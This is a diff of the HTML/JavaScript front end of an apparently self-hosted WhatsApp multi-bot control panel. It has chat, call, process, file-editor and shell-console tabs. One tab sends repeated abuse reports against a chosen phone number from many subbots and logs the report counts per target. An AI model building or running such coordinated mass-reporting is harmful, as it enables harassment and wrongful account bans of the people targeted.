+            <button class="btn btn-warn" onclick="promptSticker()">🏷️ Enviar URL como Sticker</button>
+            <button class="btn btn-ghost" onclick="clearChat()">🗑️ Vaciar Chat Local</button>
+            <button class="btn btn-danger" onclick="sendAct('block')">🚫 Bloquear</button>
+            <button class="btn btn-success" onclick="sendAct('unblock')">✅ Desbloquear</button>
           </div>
         </div>
       </div>
     </div>
   </div>
-
   <div id="tab-calls" class="section">
-    <div class="card" style="margin-bottom:14px;">
-      <div class="flex-row" style="justify-content:space-between;">
-        <div>
-          <h3>📞 Central de Llamadas & Defensa Anti-Call</h3>
-          <p style="font-size:12px; color:var(--muted); margin-top:4px;">Monitorea llamadas entrantes/salientes en todos los subbots, rechaza llamadas automáticamente o lanza timbrados directos.</p>
-        </div>
-        <div class="flex-row" style="margin:0;">
-          <button class="btn" id="btnAutoRejectCalls" onclick="toggleAutoRejectCalls()">🛡️ Auto-Rechazar: OFF</button>
-        </div>
-      </div>
-      <div class="flex-row" style="margin-top:12px;">
-        <input type="text" id="autoRejectMsgInput" placeholder="Mensaje automático al rechazar llamada..." style="flex:1; min-width:240px;">
-        <button class="btn btn-success" onclick="saveAutoRejectSettings()">💾 Guardar Respuesta</button>
-      </div>
-      <hr style="border:none; border-top:1px solid var(--border); margin:14px 0;">
-      <h4>📲 Lanzar Llamada / Timbrado desde un Subbot</h4>
-      <div class="flex-row" style="margin-top:10px;">
-        <select id="callBotSelector" style="max-width:240px;"></select>
-        <input type="text" id="callTargetInput" placeholder="Número o JID (ej: 573001234567)" style="max-width:260px;">
-        <select id="callTypeSelect" style="max-width:160px;">
-          <option value="voice">📞 Llamada de Voz</option>
-          <option value="video">📹 Videollamada</option>
-        </select>
-        <button class="btn btn-wa" onclick="initiateManualCall()">🚀 Llamar Ahora</button>
-      </div>
+    <div class="card" style="margin-bottom:12px">
+      <div class="flex-row" style="justify-content:space-between"><h3>📞 Central de Llamadas & Anti-Call</h3><button class="btn" id="btnAutoRej" onclick="callApi({action:'toggle-autoreject'})">🛡️ Auto-Rechazar: OFF</button></div>
+      <div class="flex-row"><input id="rejMsgInp" placeholder="Mensaje al rechazar llamada..." style="flex:1"><button class="btn btn-success" onclick="callApi({action:'set-message',message:el('rejMsgInp').value});alert('Guardado')">💾 Guardar</button></div>
+      <div class="flex-row" style="margin-top:8px"><select id="callBotSel" style="max-width:220px"></select><input id="callTarget" placeholder="Número o JID (ej: 573001234567)" style="max-width:240px"><select id="callType" style="max-width:140px"><option value="voice">📞 Voz</option><option value="video">📹 Video</option></select><button class="btn btn-wa" onclick="manualCall()">🚀 Llamar</button></div>
     </div>
-
-    <div class="card">
-      <div class="flex-row" style="justify-content:space-between;">
-        <h3>📋 Historial de Llamadas en Tiempo Real</h3>
-        <button class="btn btn-ghost" onclick="clearCallLogs()">🗑️ Limpiar Registro</button>
-      </div>
-      <div class="table-wrap">
-        <table>
-          <thead><tr><th>Hora</th><th>Subbot</th><th>Contacto / JID</th><th>Tipo</th><th>Dirección</th><th>Estado</th><th>Acciones</th></tr></thead>
-          <tbody id="callsTable"></tbody>
-        </table>
-      </div>
-    </div>
+    <div class="card"><div class="flex-row" style="justify-content:space-between"><h3>📋 Historial de Llamadas</h3><button class="btn btn-ghost" onclick="callApi({action:'clear-logs'})">🗑️ Limpiar</button></div><div class="table-wrap"><table><thead><tr><th>Hora</th><th>Subbot</th><th>Contacto</th><th>Tipo</th><th>Estado</th><th>Acción</th></tr></thead><tbody id="callsTb"></tbody></table></div></div>
   </div>
-
   <div id="tab-dash" class="section">
     <div class="grid">
-      <div class="card"><div class="card-title">Instancias Activas</div><div class="card-val" id="mSubbots">0</div><div class="card-sub" id="mSubState">Operando</div></div>
-      <div class="card"><div class="card-title">Tráfico Mensajes</div><div class="card-val" id="mMsgs">0 / 0</div><div class="card-sub">RX Recibidos / TX Enviados</div></div>
-      <div class="card"><div class="card-title">Grupos en Red</div><div class="card-val" id="mGroups">0</div><div class="card-sub">Sincronizados</div></div>
-      <div class="card"><div class="card-title">Memoria (RSS / Heap)</div><div class="card-val" id="mRam">0 MB</div><div class="card-sub" id="mCpu">CPU: 0.00</div></div>
+      <div class="card"><div class="card-title">Instancias</div><div class="card-val" id="mSubs">0</div><div class="card-sub" id="mSubSt">Operando</div></div>
+      <div class="card"><div class="card-title">Mensajes RX / TX</div><div class="card-val" id="mMsgs">0 / 0</div><div class="card-sub">Tiempo real</div></div>
+      <div class="card"><div class="card-title">Grupos</div><div class="card-val" id="mGrps">0</div><div class="card-sub">En memoria</div></div>
+      <div class="card"><div class="card-title">RAM (RSS / Heap)</div><div class="card-val" id="mRam">0 MB</div><div class="card-sub" id="mCpu">CPU: 0.00</div></div>
     </div>
-
-    <div class="card">
-      <div class="flex-row" style="justify-content: space-between;">
-        <h3>🤖 Control de Nodos (Main + Subbots)</h3>
-        <div class="flex-row" style="margin:0;">
-          <button class="btn btn-warn" onclick="togglePauseSubbots()" id="btnPauseSubs">⏸️ Pausar Todos</button>
-          <button class="btn btn-success" onclick="cleanRam()">🧹 Limpiar RAM</button>
-        </div>
-      </div>
-      <div class="table-wrap">
-        <table>
-          <thead><tr><th>#</th><th>JID / Número</th><th>Nombre</th><th>Estado</th><th>Rol</th><th>Acciones</th></tr></thead>
-          <tbody id="subbotsTable"></tbody>
-        </table>
-      </div>
-    </div>
+    <div class="card"><div class="flex-row" style="justify-content:space-between"><h3>🤖 Nodos Conectados</h3><div class="wa-row"><button class="btn btn-warn" id="btnPauseAll" onclick="api('toggle-subbots','POST',{}).then(refreshStatus)">⏸️ Pausar Todos</button><button class="btn btn-success" onclick="cleanRam()">🧹 Limpiar RAM</button></div></div><div class="table-wrap"><table><thead><tr><th>#</th><th>Número</th><th>Nombre</th><th>Estado</th><th>Rol</th><th>Acciones</th></tr></thead><tbody id="subsTb"></tbody></table></div></div>
   </div>
-
-  <div id="tab-procs" class="section">
-    <div class="card">
-      <div class="flex-row" style="justify-content: space-between;">
-        <h3>💀 Procesos del Servidor y Memoria</h3>
-        <div class="flex-row" style="margin:0;">
-          <input type="text" id="multiPidInput" placeholder="PIDs (ej: 1204, 1502)" style="width:200px;">
-          <button class="btn btn-danger" onclick="killMultiplePids()">Matar PIDs</button>
-          <button class="btn btn-success" onclick="cleanRam()">Forzar GC / RAM</button>
-        </div>
-      </div>
-      <div class="table-wrap">
-        <table>
-          <thead><tr><th>PID</th><th>Proceso</th><th>% CPU</th><th>% MEM</th><th>Acción</th></tr></thead>
-          <tbody id="procsTable"></tbody>
-        </table>
-      </div>
-    </div>
-  </div>
-
-  <div id="tab-cmds" class="section">
-    <div class="card">
-      <h3>🛠️ Bloqueo de Comandos por Mantenimiento</h3>
-      <div class="flex-row" style="margin-top:10px;">
-        <input type="text" id="customCmdInput" placeholder="Comando (ej: play, sticker, lid)" style="max-width:280px;">
-        <button class="btn btn-danger" onclick="toggleCmdManual()">Alternar Estado</button>
-      </div>
-      <div class="cmd-grid" id="cmdGrid"></div>
-    </div>
-  </div>
-
-  <div id="tab-spam" class="section">
-    <div class="card">
-      <h3>🚨 Ejecutor y Auditoría de Reportes por Subbots</h3>
-      <div class="flex-row" style="margin-top:10px;">
-        <input type="text" id="spamTarget" placeholder="Número (ej: 573001234567)" style="max-width:240px;">
-        <input type="number" id="spamCycles" value="5" min="1" max="20" style="max-width:100px;">
-        <button class="btn btn-danger" onclick="runSpamReport()">🚀 Ejecutar con Subbots</button>
-      </div>
-      <div class="table-wrap">
-        <table>
-          <thead><tr><th>Objetivo</th><th>Total Reportes</th><th>Subbots Usados</th><th>Último Evento</th></tr></thead>
-          <tbody id="spamTable"></tbody>
-        </table>
-      </div>
-    </div>
-  </div>
-
-  <div id="tab-files" class="section">
-    <div class="card">
-      <h3>📁 Explorador y Editor en Vivo</h3>
-      <div class="flex-row" style="margin-top:10px;">
-        <input type="text" id="currentDirInput" value="." style="max-width:300px;">
-        <button class="btn" onclick="loadDir()">📂 Abrir Carpeta</button>
-      </div>
-      <div id="fileList" style="display:flex; gap:6px; flex-wrap:wrap; margin-bottom:12px;"></div>
-      <div class="flex-row" style="justify-content: space-between;">
-        <input type="text" id="editingFilePath" placeholder="Archivo seleccionado..." readonly style="max-width:400px;">
-        <button class="btn btn-success" onclick="saveFileContent()">💾 Guardar Cambios</button>
-      </div>
-      <textarea id="fileEditor" placeholder="Selecciona un archivo para editar..."></textarea>
-    </div>
-  </div>
-
-  <div id="tab-bench" class="section">
-    <div class="card">
-      <h3>⚡ Benchmark V8 & Terminal Shell</h3>
-      <div class="flex-row" style="margin-top:10px;">
-        <button class="btn" onclick="runBenchmark()">🔥 Ejecutar Benchmark</button>
-      </div>
-      <pre id="benchOutput">Pulsa el botón para medir rendimiento...</pre>
-      <h3 style="margin-top:16px;">💻 Consola Shell</h3>
-      <div class="flex-row" style="margin-top:8px;">
-        <input type="text" id="shellCmdInput" placeholder="Comando (ej: df -h, free -m, ps aux)" style="max-width:400px;">
-        <button class="btn btn-warn" onclick="runShellTest()">Ejecutar</button>
-      </div>
-      <pre id="shellOutput">Listo...</pre>
-    </div>
-  </div>
+  <div id="tab-procs" class="section"><div class="card"><div class="flex-row" style="justify-content:space-between"><h3>💀 Procesos & RAM</h3><div class="wa-row"><input id="pidsInp" placeholder="PIDs (ej: 1204,1502)" style="width:180px"><button class="btn btn-danger" onclick="killPids()">Matar</button><button class="btn btn-success" onclick="cleanRam()">Forzar GC</button></div></div><div class="table-wrap"><table><thead><tr><th>PID</th><th>Proceso</th><th>%CPU</th><th>%MEM</th><th>Acción</th></tr></thead><tbody id="procsTb"></tbody></table></div></div></div>
+  <div id="tab-cmds" class="section"><div class="card"><h3>🛠️ Mantenimiento de Comandos</h3><div class="flex-row" style="margin-top:8px"><input id="cmdInp" placeholder="Comando (ej: play, sticker)" style="max-width:260px"><button class="btn btn-danger" onclick="toggleCmd(el('cmdInp').value.trim().replace(/^[.#/]/,''));el('cmdInp').value=''">Alternar</button></div><div class="cmd-grid" id="cmdGrid"></div></div></div>
+  <div id="tab-spam" class="section"><div class="card"><h3>🚨 Reportes por Subbots</h3><div class="flex-row" style="margin-top:8px"><input id="spamPhone" placeholder="Número (ej: 573001234567)" style="max-width:240px"><input type="number" id="spamCyc" value="5" min="1" max="20" style="max-width:90px"><button class="btn btn-danger" onclick="runSpam()">🚀 Ejecutar</button></div><div class="table-wrap"><table><thead><tr><th>Objetivo</th><th>Reportes</th><th>Subbots</th><th>Hora</th></tr></thead><tbody id="spamTb"></tbody></table></div></div></div>
+  <div id="tab-files" class="section"><div class="card"><h3>📁 Archivos & Editor</h3><div class="flex-row" style="margin-top:8px"><input id="dirInp" value="." style="max-width:280px"><button class="btn" onclick="loadDir()">📂 Listar</button></div><div id="fileList" style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px"></div><div class="flex-row" style="justify-content:space-between"><input id="editPath" readonly placeholder="Archivo abierto..." style="max-width:380px"><button class="btn btn-success" onclick="saveFile()">💾 Guardar</button></div><textarea id="fileEd" placeholder="Selecciona un archivo..."></textarea></div></div>
+  <div id="tab-bench" class="section"><div class="card"><h3>⚡ Benchmark V8 & Shell</h3><div class="flex-row" style="margin-top:8px"><button class="btn" onclick="runBench()">🔥 Ejecutar Benchmark</button></div><pre id="benchOut">Listo...</pre><div class="flex-row" style="margin-top:12px"><input id="shInp" placeholder="Comando (ej: df -h, free -m)" style="max-width:380px"><button class="btn btn-warn" onclick="runSh()">Ejecutar</button></div><pre id="shOut">Listo...</pre></div></div>
 </div>
-
-<div class="modal-backdrop" id="lightboxModal" onclick="closeLightbox()">
-  <img id="lightboxImg" class="lightbox-img" src="" alt="Vista previa">
-</div>
-
-<div class="call-banner" id="incomingCallBanner">
-  <div style="display:flex; justify-content:space-between; align-items:center;">
-    <span style="font-weight:900; color:var(--wa-green); font-size:13px;" id="bannerCallType">📞 LLAMADA ENTRANTE</span>
-    <span style="font-size:11px; color:var(--muted);" id="bannerCallBot"></span>
-  </div>
-  <div style="font-size:16px; font-weight:800; color:#fff;" id="bannerCallerName">Desconocido</div>
-  <div style="font-size:12px; color:var(--muted);" id="bannerCallerJid"></div>
-  <div class="flex-row" style="margin:4px 0 0; justify-content:space-between;">
-    <button class="btn btn-danger" style="flex:1;" onclick="rejectBannerCall()">📵 Rechazar</button>
-    <button class="btn btn-wa" style="flex:1;" onclick="openBannerCallerChat()">💬 Abrir Chat</button>
-  </div>
-</div>
-
+<div class="modal" id="lightbox" onclick="this.classList.remove('open')"><img id="lbImg" src=""></div>
+<div class="call-pop" id="callPop"><div style="display:flex;justify-content:space-between"><b style="color:var(--wag);font-size:12px" id="cpType">📞 LLAMADA</b><span style="font-size:11px;color:var(--mut)" id="cpBot"></span></div><div style="font-size:15px;font-weight:800" id="cpName"></div><div style="font-size:11px;color:var(--mut)" id="cpJid"></div><div class="wa-row"><button class="btn btn-danger" style="flex:1" onclick="rejPopCall()">📵 Cortar</button><button class="btn btn-wa" style="flex:1" onclick="openPopChat()">💬 Chat</button></div></div>
 <script>
-const TOKEN = "${token}";
-let selectedBotKey = "";
-let selectedChatJid = "";
-let chatFilterMode = "all";
-let cachedChats = [];
-let currentMessages = [];
-let knownBots = [];
-let replyTargetMsg = null;
-let activeBannerCall = null;
-let mediaRecorder = null;
-let recordedChunks = [];
-let lastTypingSent = 0;
-let serverUptimeSec = 0;
-let isFetchingStatus = false;
-let isFetchingChats = false;
-let isFetchingMsgs = false;
-let lastChatListSignature = "";
-let lastMsgListSignature = "";
+const TOKEN="${token}",el=id=>document.getElementById(id),esc=s=>String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+let botKey="",chatJid="",filterMode="all",chats=[],msgs=[],bots=[],replyMsg=null,popCall=null,rec=null,chunks=[],lastTyp=0,upSec=0,busySt=false,busyCh=false,busyMs=false,sigCh="",sigMs="";
+const EMOJIS=["😂","❤️","🔥","👍","😭","🙏","😍","🥰","🤣","😊","😎","🙌","💀","👀","✨","🎉","💯","😡","🤔","👏","🫡","⚡","🚀","👑","✅","❌"];
+el('emoBar').innerHTML=EMOJIS.map(e=>'<span class="wa-emo" onclick="el(\\'msgInp\\').value+=\\''+e+'\\';el(\\'msgInp\\').focus()">'+e+'</span>').join('');
+setInterval(()=>{if(upSec>0){upSec++;const h=Math.floor(upSec/3600),m=Math.floor((upSec%3600)/60),s=upSec%60;el('uptimeBadge').textContent='⏱️ '+h+'h '+m+'m '+s+'s';}},1000);
 
-const EMOJI_LIST = ["😂","❤️","🔥","👍","😭","🙏","😍","🥰","🤣","😊","😎","🙌","💀","👀","✨","🎉","💯","😡","😱","🤔","👏","🫡","🤝","⚡","🚀","👑","💎","🤖","✅","❌"];
+function tab(id,b){document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active'));el('tab-'+id).classList.add('active');if(b)b.classList.add('active');if(id==='files')loadDir();if(id==='cmds')loadCmds();if(id==='wa')refreshChats(true);if(id==='procs')loadProcs();}
+async function api(p,m='GET',body=null,ms=7000){const c=new AbortController(),t=setTimeout(()=>c.abort(),ms);try{const o={method:m,headers:{'Content-Type':'application/json','x-aura-token':TOKEN},signal:c.signal};if(body)o.body=JSON.stringify(body);const r=await fetch('/api/'+p+(p.includes('?')?'&':'?')+'token='+TOKEN,o);return await r.json();}finally{clearTimeout(t);}}
+function avHtml(name,jid,isG,url){const ini=(name||'?').replace(/[^a-zA-Z0-9]/g,'').slice(0,2).toUpperCase()||(isG?'👥':'👤');const u=url||('/api/wa-avatar?botKey='+encodeURIComponent(botKey)+'&jid='+encodeURIComponent(jid)+'&token='+TOKEN);return '<img src="'+esc(u)+'" loading="lazy" onerror="this.style.display=\\'none\\';this.parentNode.textContent=\\''+esc(ini)+'\\'">';}
 
-function formatSeconds(sec) {
-  const sTotal = Math.max(0, Math.floor(sec));
-  const h = Math.floor(sTotal / 3600);
-  const m = Math.floor((sTotal % 3600) / 60);
-  const s = sTotal % 60;
-  return h + 'h ' + m + 'm ' + s + 's';
+async function refreshStatus(){
+  if(busySt)return;busySt=true;
+  try{
+    const d=await api('status','GET',null,4500);
+    if(typeof d.uptimeSec==='number')upSec=d.uptimeSec;
+    el('mSubs').textContent=d.subbots.length;el('mSubSt').textContent=d.subbotsPaused?'⏸️ PAUSADOS':'🟢 OPERANDO';
+    el('btnPauseAll').textContent=d.subbotsPaused?'▶️ Reanudar Todos':'⏸️ Pausar Todos';
+    el('mMsgs').textContent=d.msgRx+' / '+d.msgTx;el('mGrps').textContent=d.groupsCount;
+    el('mRam').textContent=d.ramRss+' / '+d.ramHeap+' MB';el('mCpu').textContent='CPU: '+d.loadAvg;
+    bots=d.subbots||[];
+    const sel=el('botSel'),csel=el('callBotSel'),prev=sel.value||botKey;
+    const opts=bots.map((s,i)=>'<option value="'+esc(s.id)+'">'+esc((i===0?'👑 Main: ':'🤖 Sub #'+i+': ')+s.name+' (+'+s.id+')')+'</option>').join('');
+    if(sel.dataset.sig!==opts){sel.dataset.sig=opts;sel.innerHTML=opts;csel.innerHTML=opts;if(prev&&bots.some(b=>b.id===prev)){sel.value=prev;botKey=prev;}else if(bots[0]){botKey=bots[0].id;sel.value=botKey;}}
+    el('subsTb').innerHTML=bots.map((s,i)=>'<tr><td>#'+(i+1)+'</td><td><code>+'+esc(s.id)+'</code></td><td>'+esc(s.name)+'</td><td><span class="pill '+(s.paused?'pill-off':'pill-on')+'">'+(s.paused?'PAUSADO':'ONLINE')+'</span></td><td>'+esc(s.role)+'</td><td><button class="btn btn-wa" style="padding:4px 8px;margin-right:4px" onclick="jumpBot(\\''+esc(s.id)+'\\')">💬 Chats</button><button class="btn '+(s.paused?'btn-success':'btn-warn')+'" style="padding:4px 8px" onclick="api(\\'toggle-single-bot\\',\\'POST\\',{botKey:\\''+esc(s.id)+'\\'}).then(refreshStatus)">'+(s.paused?'▶️':'⏸️')+'</button></td></tr>').join('');
+    el('spamTb').innerHTML=(d.reports||[]).length?d.reports.map(r=>'<tr><td><code>+'+esc(r.phone)+'</code></td><td><b>'+r.totalReports+'</b></td><td>'+r.subbotsCount+'</td><td>'+esc(r.lastTimestamp)+'</td></tr>').join(''):'<tr><td colspan="4" style="color:var(--mut)">Sin registros.</td></tr>';
+    renderCalls(d.calls||[],d.autoRejectCalls,d.autoRejectMessage);
+  }catch{}finally{busySt=false;}
 }
 
-setInterval(() => {
-  if (serverUptimeSec > 0) {
-    serverUptimeSec++;
-    const badge = document.getElementById('uptimeBadge');
-    if (badge) badge.textContent = '⏱️ ' + formatSeconds(serverUptimeSec);
-  }
-}, 1000);
-
-function initEmojiBar() {
-  const bar = document.getElementById('waEmojiBar');
-  bar.innerHTML = EMOJI_LIST.map(e => '<span class="wa-emoji-item" onclick="insertEmoji(\\'' + e + '\\')">' + e + '</span>').join('');
+function renderCalls(calls,autoRej,autoMsg){
+  const pill=el('callPill');pill.style.display=calls.length?'inline-block':'none';pill.textContent=calls.length;
+  el('btnAutoRej').textContent=autoRej?'🛡️ Auto-Rechazar: ON':'🛡️ Auto-Rechazar: OFF';
+  el('btnAutoRej').className='btn '+(autoRej?'btn-success':'btn-warn');
+  if(document.activeElement!==el('rejMsgInp')&&autoMsg)el('rejMsgInp').value=autoMsg;
+  el('callsTb').innerHTML=calls.length?calls.map(c=>'<tr><td>'+esc(c.timeStr)+'</td><td><code>+'+esc(c.botKey)+'</code></td><td><b>'+esc(c.peerName)+'</b><br><span style="color:var(--mut);font-size:10px">'+esc(c.peerJid)+'</span></td><td>'+(c.isVideo?'📹 Video':'📞 Voz')+'</td><td><span class="pill '+(c.status==='reject'?'pill-off':'pill-on')+'">'+esc(c.status.toUpperCase())+'</span></td><td><button class="btn btn-danger" style="padding:4px 7px;margin-right:4px" onclick="callApi({action:\\'reject\\',botKey:\\''+esc(c.botKey)+'\\',callId:\\''+esc(c.id)+'\\',peerJid:\\''+esc(c.peerJid)+'\\'})">📵</button><button class="btn btn-wa" style="padding:4px 7px" onclick="jumpCallChat(\\''+esc(c.botKey)+'\\',\\''+esc(c.peerJid)+'\\')">💬</button></td></tr>').join(''):'<tr><td colspan="6" style="color:var(--mut);text-align:center">Sin llamadas registradas.</td></tr>';
+  const off=calls.find(c=>(c.status==='offer'||c.status==='ringing')&&(Date.now()-c.timestamp<28000));
+  if(off){popCall=off;el('cpType').textContent=off.isVideo?'📹 VIDEOLLAMADA':'📞 LLAMADA DE VOZ';el('cpBot').textContent='+'+off.botKey;el('cpName').textContent=off.peerName;el('cpJid').textContent=off.peerJid;el('callPop').classList.add('active');el('callBadge').style.display='inline-block';}
+  else{popCall=null;el('callPop').classList.remove('active');el('callBadge').style.display='none';}
 }
 
-function toggleEmojiBar() {
-  document.getElementById('waEmojiBar').classList.toggle('active');
+async function callApi(b){await api('wa-call','POST',b);refreshStatus();}
+function rejPopCall(){if(popCall)callApi({action:'reject',botKey:popCall.botKey,callId:popCall.id,peerJid:popCall.peerJid});}
+function openPopChat(){if(popCall)jumpCallChat(popCall.botKey,popCall.peerJid);}
+function jumpCallChat(bKey,jid){jumpBot(bKey);openChat(jid);}
+async function manualCall(){const bKey=el('callBotSel').value||botKey,raw=el('callTarget').value.trim(),isVideo=el('callType').value==='video';if(!raw)return;const peerJid=raw.includes('@')?raw:raw.replace(/\\D/g,'')+'@s.whatsapp.net';await callApi({action:'offer',botKey:bKey,peerJid,isVideo});alert('Llamada iniciada');}
+async function callChat(isVideo){if(botKey&&chatJid){await callApi({action:'offer',botKey,peerJid:chatJid,isVideo});loadMsgs(chatJid,true,true);}}
+
+function jumpBot(k){botKey=k;el('botSel').value=k;chatJid="";sigCh="";sigMs="";tab('wa',document.querySelector('.tab-btn'));}
+function selectBot(){botKey=el('botSel').value;chatJid="";sigCh="";sigMs="";closeChat();el('chatList').innerHTML='<div style="padding:20px;text-align:center;color:var(--accent)">⚡ Cargando +'+esc(botKey)+'...</div>';refreshChats(true);}
+function setFilter(m,b){filterMode=m;document.querySelectorAll('.wa-chip').forEach(c=>c.classList.remove('active'));b.classList.add('active');renderChats(true);}
+async function syncGroups(){if(botKey){await api('wa-sync','POST',{botKey});setTimeout(()=>refreshChats(true),600);}}
+
+async function refreshChats(force=false){
+  if(busyCh&&!force)return;if(!botKey&&bots[0])botKey=bots[0].id;if(!botKey)return;busyCh=true;
+  try{const d=await api('wa-chats?botKey='+encodeURIComponent(botKey),'GET',null,4500);chats=d.chats||[];renderChats(force);if(chatJid)await loadMsgs(chatJid,false,force);}catch{}finally{busyCh=false;}
 }
 
-function insertEmoji(e) {
-  const inp = document.getElementById('waMessageInput');
-  inp.value += e;
-  inp.focus();
+function renderChats(force=false){
+  const q=(el('chatSearch').value||'').toLowerCase().trim();
+  const list=chats.filter(c=>(filterMode==='all'||(filterMode==='unread'&&c.unread>0)||(filterMode==='groups'&&c.isGroup)||(filterMode==='direct'&&!c.isGroup))&&(c.name.toLowerCase().includes(q)||c.jid.toLowerCase().includes(q)||(c.lastPreview||'').toLowerCase().includes(q)));
+  const sig=botKey+'|'+chatJid+'|'+filterMode+'|'+q+'|'+list.map(c=>c.jid+':'+c.lastTime+':'+c.unread+':'+c.lastPreview).join(',');
+  if(!force&&sig===sigCh)return;sigCh=sig;
+  if(!list.length){el('chatList').innerHTML='<div style="padding:22px;text-align:center;color:var(--mut);font-size:12px">Sin conversaciones. Pulsa 🔄 o ➕.</div>';return;}
+  el('chatList').innerHTML=list.slice(0,110).map(c=>'<div class="wa-item '+(c.jid===chatJid?'active':'')+'" onclick="openChat(\\''+esc(c.jid)+'\\')"><div class="wa-av" style="background:'+(c.isGroup?'#5e35b1':'#008069')+'">'+avHtml(c.name,c.jid,c.isGroup,c.avatarUrl)+'</div><div class="wa-meta"><div class="wa-name">'+esc(c.name)+'</div><div class="wa-prev">'+esc(c.lastPreview||c.jid)+'</div></div><div class="wa-right"><div class="wa-time">'+(c.lastTime?new Date(c.lastTime).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}):'')+'</div>'+(c.unread>0?'<span class="wa-unread">'+c.unread+'</span>':'')+'</div></div>').join('');
 }
 
-function switchTab(id, btn) {
-  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-  document.getElementById('tab-' + id).classList.add('active');
-  if (btn) btn.classList.add('active');
-  if (id === 'files') loadDir();
-  if (id === 'cmds') loadCommands();
-  if (id === 'wa') refreshWaChats(true);
-  if (id === 'calls') refreshCallCenter();
-  if (id === 'procs') loadProcesses();
-}
+async function openChat(jid){chatJid=jid;sigMs="";cancelReply();el('waWrap').classList.add('chat-open');el('headActs').style.display='flex';renderChats(true);await loadMsgs(jid,true,true);}
+function closeChat(){el('waWrap').classList.remove('chat-open');el('infoDrawer').classList.remove('open');}
+function toggleDrawer(){if(chatJid)el('infoDrawer').classList.toggle('open');}
 
-async function api(path, method = 'GET', body = null, timeoutMs = 8000) {
-  const controller = new AbortController();
-  const timer = setTimeout(() => controller.abort(), timeoutMs);
-  try {
-    const opts = {
-      method,
-      headers: { 'Content-Type': 'application/json', 'x-aura-token': TOKEN },
-      signal: controller.signal
-    };
-    if (body) opts.body = JSON.stringify(body);
-    const sep = path.includes('?') ? '&' : '?';
-    const r = await fetch('/api/' + path + sep + 'token=' + TOKEN, opts);
-    return await r.json();
-  } finally {
-    clearTimeout(timer);
-  }
-}
+async function loadMsgs(jid,scroll=false,force=false){
+  if((busyMs&&!force)||!botKey||!jid)return;busyMs=true;
+  try{
+    const d=await api('wa-messages?botKey='+encodeURIComponent(botKey)+'&jid='+encodeURIComponent(jid),'GET',null,4500);
+    if(!d.chat)return;
+    msgs=d.chat.messages||[];
+    const sig=botKey+'|'+jid+'|'+msgs.map(m=>m.id+':'+m.text+':'+Object.values(m.reactions||{}).join('')).join(',');
+    if(!force&&sig===sigMs)return;sigMs=sig;
 
-function escapeHtml(str) {
-  return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-}
+    el('actName').textContent=d.chat.name||jid;el('actJid').textContent='+'+botKey+' • '+d.chat.jid;
+    el('actAv').innerHTML=avHtml(d.chat.name,d.chat.jid,d.chat.isGroup,d.chat.avatarUrl);
+    el('drwName').textContent=d.chat.name||jid;el('drwJid').textContent=d.chat.jid;
+    el('drwBio').textContent=d.chat.statusText||(d.chat.isGroup?'Grupo activo':'Cuenta de WhatsApp');
+    el('drwAv').innerHTML=avHtml(d.chat.name,d.chat.jid,d.chat.isGroup,d.chat.avatarUrl);
 
-function openLightbox(url) {
-  const modal = document.getElementById('lightboxModal');
-  document.getElementById('lightboxImg').src = url;
-  modal.classList.add('open');
-}
+    const box=el('msgBox'),nearBot=box.scrollHeight-box.scrollTop-box.clientHeight<150;
+    if(!msgs.length){box.innerHTML='<div style="margin:auto;color:var(--mut);font-size:12px;text-align:center;background:#111b21;padding:12px 18px;border-radius:10px">🔒 Envía o recibe un mensaje para verlo en tiempo real.</div>';return;}
 
-function closeLightbox() {
-  document.getElementById('lightboxModal').classList.remove('open');
-}
-
-async function refreshTelemetry() {
-  if (isFetchingStatus) return;
-  isFetchingStatus = true;
-  try {
-    const d = await api('status', 'GET', null, 5000);
-    if (typeof d.uptimeSec === 'number') {
-      serverUptimeSec = d.uptimeSec;
-      document.getElementById('uptimeBadge').textContent = '⏱️ ' + formatSeconds(serverUptimeSec);
-    }
-    document.getElementById('mSubbots').textContent = d.subbots.length;
-    document.getElementById('mSubState').textContent = d.subbotsPaused ? '⏸️ PAUSADOS' : '🟢 OPERANDO';
-    document.getElementById('btnPauseSubs').textContent = d.subbotsPaused ? '▶️ Reanudar Todos' : '⏸️ Pausar Todos';
-    document.getElementById('mMsgs').textContent = d.msgRx + ' / ' + d.msgTx;
-    document.getElementById('mGroups').textContent = d.groupsCount;
-    document.getElementById('mRam').textContent = d.ramRss + ' / ' + d.ramHeap + ' MB';
-    document.getElementById('mCpu').textContent = 'CPU Load: ' + d.loadAvg;
-
-    knownBots = d.subbots || [];
-    const selector = document.getElementById('waBotSelector');
-    const callSelector = document.getElementById('callBotSelector');
-    const prevVal = selector.value || selectedBotKey;
-    const optsHtml = knownBots.map((s, idx) => {
-      const label = (idx === 0 ? '👑 Main: ' : '🤖 Sub #' + idx + ': ') + s.name + ' (+' + s.id + ')';
-      return '<option value="' + escapeHtml(s.id) + '">' + escapeHtml(label) + '</option>';
+    box.innerHTML=msgs.map(m=>{
+      const side=m.fromMe?'out':'in',isStk=m.mediaType==='sticker';
+      const sender=(!m.fromMe&&d.chat.isGroup&&!isStk)?'<div class="wa-sender" onclick="el(\\'msgInp\\').value+=\\'@'+esc(m.sender)+' \\';el(\\'msgInp\\').focus()">'+esc(m.pushName||'+'+m.sender)+'</div>':'';
+      const quote=m.quotedText?'<div class="wa-quote"><b style="color:var(--wag)">'+esc(m.quotedSender?'+'+m.quotedSender:'Cita')+'</b><div>'+esc(m.quotedText)+'</div></div>':'';
+      const mUrl='/api/media?id='+encodeURIComponent(m.id)+'&botKey='+encodeURIComponent(botKey)+'&token='+TOKEN;
+      const tUrl='/api/thumb?id='+encodeURIComponent(m.id)+'&token='+TOKEN;
+      let media='';
+      if(m.mediaType==='image')media='<img class="wa-img" src="'+mUrl+'" loading="lazy" onclick="el(\\'lbImg\\').src=\\''+mUrl+'\\';el(\\'lightbox\\').classList.add(\\'open\\')">';
+      else if(isStk)media='<img class="wa-stk" src="'+mUrl+'" loading="lazy" onclick="el(\\'lbImg\\').src=\\''+mUrl+'\\';el(\\'lightbox\\').classList.add(\\'open\\')">';
